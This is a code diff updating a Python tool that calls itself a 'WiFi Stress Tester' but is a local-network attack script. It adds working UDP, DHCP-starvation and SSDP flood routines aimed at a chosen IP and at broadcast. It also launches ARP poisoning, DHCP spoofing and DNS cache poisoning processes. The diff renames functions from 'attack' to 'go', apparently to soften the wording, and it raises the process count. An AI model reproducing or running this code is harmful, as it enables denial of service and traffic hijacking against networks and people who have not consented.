@@ -1,4 +1,4 @@
-# WiFi Stress Tester v3.0.0
+# WiFi Stress Tester v3.1.0
 # FOR EDUCATIONAL PURPOSES ONLY - I AM NOT RESPONSIBLE FOR ANY MISUSE
 # Devs: tg: @oeuts & @One_mIZa
 import os, re, sys, time, socket, random, struct, threading, subprocess, multiprocessing, collections, json, select
@@ -20,7 +20,7 @@ cfg = {
     'SCRIPT_FILE': "wifi-tester.py",
     'MENU_OPTIONS': ["", "0"],
     'DEF_IP': "192.168.1.1",
-    'CURRENT_VER': "3.0.0",
+    'CURRENT_VER': "3.1.0",
     'CHECK_UPDATES': True
 }
 
@@ -259,7 +259,7 @@ def get_duration(previous_target, previous_cores):
         try:
             dur_str = get_input(f"""[yellow]Test Duration [seconds]:[/yellow]
 Enter - 300 seconds (default)
-0 - Infinite attack
+0 - Infinite go
 1-9999 - Set specific time
 [bold cyan][B][/bold cyan] Back to IP selection""")
             if dur_str.lower() == "b":
@@ -303,7 +303,13 @@ class NetworkLoadTester:
         self.port_scan_process = multiprocessing.Process(target=self._port_scan_monitor)
         self.port_scan_process.daemon = True
         self.port_scan_process.start()
-        
+
+        self.heavy_payloads = [
+            os.urandom(65507),
+            b'\xff' * 65507,
+            os.urandom(1400)
+        ]
+
         self.buffer_cache = []
         for _ in range(100):
             size = random.randint(500, 1472)
@@ -415,8 +421,88 @@ class NetworkLoadTester:
                 with self.open_ports.get_lock():
                     self.open_ports.value = 0
                 time.sleep(5)
+
+    def mega_udp_flood(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setblocking(0)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
+            
+            start_time = time.time()
+            p_sent, b_sent = 0, 0
+            
+            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
+                for _ in range(1500):
+                    try:
+                        port = random.randint(1, 65535)
+                        data = random.choice(self.heavy_payloads)
+                        sock.sendto(data, (self.target, port))
+                        sock.sendto(data[:1400], ('255.255.255.255', port))
+                        p_sent += 2
+                        b_sent += len(data) + 1400
+                    except:
+                        continue
+                
+                try:
+                    self.stats_queue.put_nowait((p_sent, b_sent))
+                    p_sent, b_sent = 0, 0
+                except: pass
+                time.sleep(0.0003)
+        except: pass
+
+    def dhcp_flood_go(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            
+            start_time = time.time()
+            p_sent, b_sent = 0, 0
+            
+            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
+                for _ in range(1000):
+                    try:
+                        mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
+                        packet = b'\x01\x01\x06\x00' + os.urandom(4) + b'\x00\x00\x80\x00'
+                        packet += b'\x00'*16 + mac + b'\x00'*202
+                        packet += b'\x63\x82\x53\x63\x35\x01\x01\xff'
+                        sock.sendto(packet, ('255.255.255.255', 67))
+                        sock.sendto(packet, (self.target, 67))
+                        p_sent += 2
+                        b_sent += len(packet) * 2
+                    except: continue
+                
+                try:
+                    self.stats_queue.put_nowait((p_sent, b_sent))
+                    p_sent, b_sent = 0, 0
+                except: pass
+                time.sleep(0.0003)
+        except: pass
+
+    def upnp_ssdp_go(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            msg = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: upnp:rootdevice\r\n\r\n'
+            
+            start_time = time.time()
+            p_sent, b_sent = 0, 0
+            
+            while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
+                for _ in range(1000):
+                    try:
+                        sock.sendto(msg, ('239.255.255.250', 1900))
+                        sock.sendto(msg, (self.target, 1900))
+                        p_sent += 2
+                        b_sent += len(msg) * 2
+                    except: continue
+                
+                try:
+                    self.stats_queue.put_nowait((p_sent, b_sent))
+                    p_sent, b_sent = 0, 0
+                except: pass
+                time.sleep(0.0003)
+        except: pass
     
-    def arp_poisoning_attack(self):
+    def arp_poisoning_go(self):
         try:
             target_parts = self.target.split('.')
             target_base = '.'.join(target_parts[:3])
@@ -486,7 +572,7 @@ class NetworkLoadTester:
         except:
             pass
     
-    def dhcp_spoofing_attack(self):
+    def dhcp_spoofing_go(self):
         try:
             start_time = time.time()
             packets_sent = 0
@@ -542,7 +628,7 @@ class NetworkLoadTester:
         except:
             pass
     
-    def dns_cache_poisoning_attack(self):
+    def dns_cache_poisoning_go(self):
         try:
             start_time = time.time()
             packets_sent = 0
@@ -606,56 +692,7 @@ class NetworkLoadTester:
         except:
             pass
     
-    def dhcp_flood_attack(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setblocking(0)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)
-        except:
-            return
-        
-        dhcp_packets = []
-        for _ in range(50):
-            mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
-            packet = b'\x01\x01\x06\x00' + os.urandom(4) + b'\x00\x00\x80\x00'
-            packet += b'\x00'*16 + mac + b'\x00'*202
-            packet += b'\x63\x82\x53\x63\x35\x01\x01\xff'
-            dhcp_packets.append(packet)
-        
-        start_time = time.time()
-        packets_sent = 0
-        bytes_sent = 0
-        last_stats_time = time.time()
-        
-        while self.running and (self.duration == 999999999 or time.time() - start_time < self.duration):
-            try:
-                for _ in range(50):
-                    packet = random.choice(dhcp_packets)
-                    sock.sendto(packet, ('255.255.255.255', 67))
-                    sock.sendto(packet, (self.target, 67))
-                    packets_sent += 2
-                    bytes_sent += len(packet) * 2
-                
-                now = time.time()
-                if now - last_stats_time >= 0.1:
-                    try:
-                        self.stats_queue.put_nowait((packets_sent, bytes_sent))
-                    except:
-                        pass
-                    packets_sent = 0
-                    bytes_sent = 0
-                    last_stats_time = now
-                    
-            except:
-                pass
-        
-        try:
-            sock.close()
-        except:
-            pass
-    
-    def broadcast_udp_attack(self):
+    def broadcast_udp_go(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setblocking(0)
@@ -764,7 +801,7 @@ class NetworkLoadTester:
             except:
                 pass
     
-    def dns_attack(self):
+    def dns_go(self):
         domains = [
             '_services._dns-sd._udp.local',
             '_http._tcp.local',
@@ -838,31 +875,43 @@ class NetworkLoadTester:
         processes = []
         
         for _ in range(self.test_threads):
-            p = multiprocessing.Process(target=self.arp_poisoning_attack)
+            p = multiprocessing.Process(target=self.mega_udp_flood)
+            p.daemon = True
+            p.start()
+            processes.append(p)
+            
+        for _ in range(self.test_threads // 2):
+            p = multiprocessing.Process(target=self.upnp_ssdp_go)
+            p.daemon = True
+            p.start()
+            processes.append(p)
+            
+        for _ in range(self.test_threads):
+            p = multiprocessing.Process(target=self.arp_poisoning_go)
             p.daemon = True
             p.start()
             processes.append(p)
         
         for _ in range(self.test_threads // 2):
-            p = multiprocessing.Process(target=self.dhcp_spoofing_attack)
+            p = multiprocessing.Process(target=self.dhcp_spoofing_go)
             p.daemon = True
             p.start()
             processes.append(p)
         
         for _ in range(self.test_threads // 2):
-            p = multiprocessing.Process(target=self.dns_cache_poisoning_attack)
+            p = multiprocessing.Process(target=self.dns_cache_poisoning_go)
             p.daemon = True
             p.start()
             processes.append(p)
         
         for _ in range(self.test_threads):
-            p = multiprocessing.Process(target=self.dhcp_flood_attack)
+            p = multiprocessing.Process(target=self.dhcp_flood_go)
             p.daemon = True
             p.start()
             processes.append(p)
         
         for _ in range(self.test_threads):
-            p = multiprocessing.Process(target=self.broadcast_udp_attack)
+            p = multiprocessing.Process(target=self.broadcast_udp_go)
             p.daemon = True
             p.start()
             processes.append(p)
@@ -880,7 +929,7 @@ class NetworkLoadTester:
             processes.append(p)
         
         for _ in range(self.test_threads // 2):
-            p = multiprocessing.Process(target=self.dns_attack)
+            p = multiprocessing.Process(target=self.dns_go)
             p.daemon = True
             p.start()
             processes.append(p)
@@ -931,7 +980,7 @@ def menu():
             draw_ui(f"""Target: [white]{target_ip}[/]
 Duration: [white]{duration_text}[/]
 CPU Cores: [white]{CORES}[/]
-Processes: [white]{CORES * 8}[/]
+Processes: [white]{CORES * 12}[/]
 [bold cyan][*]STARTING ULTIMATE NETWORK TEST...[/bold cyan]""", rainbow=False)
             time.sleep(1)
             
@@ -1027,7 +1076,7 @@ Processes: [white]{CORES * 8}[/]
 {rainbow_color}Ping:[/] [{ping_color}]{ping_text}[/]
 {rainbow_color}Open Ports:[/] [{ports_color}]{open_ports}/18[/]
 {rainbow_color}Cores:[/] [white]{CORES}[/]
-{rainbow_color}Processes:[/] [white]{CORES * 8}[/]
+{rainbow_color}Processes:[/] [white]{CORES * 12}[/]
 {rainbow_color}Time:[/] {time_display}
 {rainbow_color}{progress_bar}[/] {progress_text}
 [bold cyan]CTRL+C TO STOP[/bold cyan]"""
